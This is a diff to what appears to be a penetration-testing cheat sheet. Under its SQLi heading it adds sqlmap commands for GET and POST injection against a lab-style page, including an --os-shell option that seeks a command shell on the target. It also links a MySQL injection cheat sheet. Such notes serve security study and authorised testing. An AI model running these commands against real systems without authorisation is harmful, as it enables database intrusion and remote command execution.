@@ -24,4 +24,7 @@
 ### XSS
 ### SQLi
 - [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
-- Sqlmap `sqlmap -u "http://ip/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title`
+- Sqlmap
+  - GET `sqlmap -u "http://ip/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title`
+  - POST `sqlmap -r request.txt -p title`
+  - Shell `sqlmap -r request.txt -p title --os-shell`
